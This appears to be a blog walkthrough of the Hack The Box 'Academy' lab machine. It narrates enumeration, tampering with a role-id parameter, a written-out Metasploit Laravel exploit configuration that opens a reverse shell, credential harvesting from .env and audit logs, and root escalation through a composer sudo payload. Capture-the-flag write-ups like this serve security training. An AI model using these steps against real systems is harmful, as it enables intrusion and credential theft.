Academy is one of the easy level boxes in Hackthebox. I obtained the initial foothold by exploiting an application using ```Metaploit Framework```. Obtaining the second user was a piece of cake after running ```Linpeas```. The root flag is also fairly easy to get.

Connect to ```Hackthebox``` and let's go.

## <ins>Enumeration</ins>
---
Starting out with our usual nmap scan...
<br>
![nmap_scan](/assets/img/hackthebox/academy/nmap_scan.png)
<br>
...I found that the ports ```22/ssh```, ```80/http``` and the port ```33060/mysqlx``` are open.

Before diving into the http service, add the following into your ```/etc/hosts``` file. ```Sudo``` permission is required to edit the file.
<br>
<pre>
10.10.10.215    academy.htb
</pre>
<br>
Going into the ```http service``` we can see a ```HTB academy``` home page. I moved into the login page.
<br>
![login_page](/assets/img/hackthebox/academy/2.png)
<br>
I used some common credentials in the login page but it was of no use. After using ```gobuster``` to enumerate further, I found some pages.
<br>
![gobuster_results](/assets/img/hackthebox/academy/3.png)
<br>
After going through some pages, I registered a new account and logged into the page.
<br>
![home_page](/assets/img/hackthebox/academy/4.png)
<br>
I took note of the one username that I found in the page. Other than that there was nothing useful in the page. So, I fired up my ```BurpSuite```.

I tried creating a new account and found that the parameter ```roleid``` is added at the end.
<br>
![role_id](/assets/img/hackthebox/academy/5.png)
<br>
I tried changing its value to ```1``` and forwarded the request.
<br>
![role_1](/assets/img/hackthebox/academy/6.png)
<br>
The account was successfully registered. After logging into the account I found two interesting things. The first thing is the ```usernames``` and the second thing is the ```vhost```.
<br>
![admin_page](/assets/img/hackthebox/academy/7.png)
<br>
Again add the ```vhost``` to the ```/etc/hosts``` file.
<br>
![etc_hosts](/assets/img/hackthebox/academy/8.png)
<br>
Now, moving into the vhost that we just found, it shows an error page. I found some interesting things from the error page. 
<br>
![error_page](/assets/img/hackthebox/academy/9.png)
<br>
I used ```searchsploit``` to check for any available exploits for the application ```Laravel``` and found some interesting exploits.
<br>
![search_sploit](/assets/img/hackthebox/academy/10.png)


## <ins>Exploit</ins>
---
The one I'll be using is the ```Metasploit module```. So, go ahead and fire up your ```Metasploit``` using the command ```msfconsole```.

After searching for the application name in the metasploit framework I found the exploit.
<br>
![meta_sploit](/assets/img/hackthebox/academy/11.png)
<br>
Use the following commands to set the variables for the exploit.
<br>
<pre>
search laravel
use 0
set rhosts 10.10.10.215
set vhost dev-staging-01.academy.htb
set lhost tun0
set app_key dBLUaMuZz7Uq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
run
</pre>
<br>
At first I didn't set the ```APP_KEY``` variable and I didn't get the reverse shell. So, make sure you do.

After editing, your options should look like this,
<br>
![options_meta](/assets/img/hackthebox/academy/12.png)
<br>
After using ```run``` we can get the reverse shell. Stabilize the shell using ```python3 pty```.
<br>
![reverse_shell](/assets/img/hackthebox/academy/13.png)


## <ins>User flag</ins>
---
After googling a bit, I found that ```Laravel``` uses ```.env``` files for database configuration. I found the ```.env``` file in the ```/var/www/html/academy``` directory.
<br>
![dot_env](/assets/img/hackthebox/academy/14.png)
<br>
Cat-ing out the contents of the file I found a password for which I didn't know the username.
<br>
![secret_pass](/assets/img/hackthebox/academy/15.png)
<br>
I tried all the usernames that I have found during the enumeration process and it seems the username ```cry0l1t3``` is the right one. Stabilizing the shell and moving into the home dir of the user we can get the ```user flag```.
<br>
![user_flag](/assets/img/hackthebox/academy/16.png)
<br>
Boom!! We got the user flag.

## <ins>User 2</ins>
---
After checking the ```id``` it seems we are a member of the group ```adm```. For those of you who don't know, ```Group adm``` is used for system monitoring tasks. Members of this group can access the log files in the ```/var/log``` directory.
<br>
![id_user](/assets/img/hackthebox/academy/17.png)
<br>
I found four log files in the ```/var/log/audit``` directory. I checked the files for any hints, meanwhile I ran ```Linpeas``` in another terminal. In the end, I found the ```hex-encoded``` password in the results of ```Linpeas```.
<br>
![linpeas_results](/assets/img/hackthebox/academy/18.png)
<br>
Decoding it, we can get the password for the user, ```mrb3n```.
<br>
![pass_user2](/assets/img/hackthebox/academy/19.png)
<br>
Change the user and stabilize the shell.
<br>
![stable_shell](/assets/img/hackthebox/academy/20.png)
<br>


## <ins>Root flag</ins>
---
Running ```sudo -l```, I found that ```composer``` can be run as root.
<br>
![sudo_l](/assets/img/hackthebox/academy/21.png)
<br>
Checking the ```GTFObins```, I found the composer sudo payload.
<br>
![gtfo_bins](/assets/img/hackthebox/academy/22.png)
<br>
Now executing the payload, we can get the root shell. The root flag can be found in the usual place i.e, ```/root``` directory.
<br>

<br>
And a final note from the creators of this box.

That's it folks. Happy hacking!!!
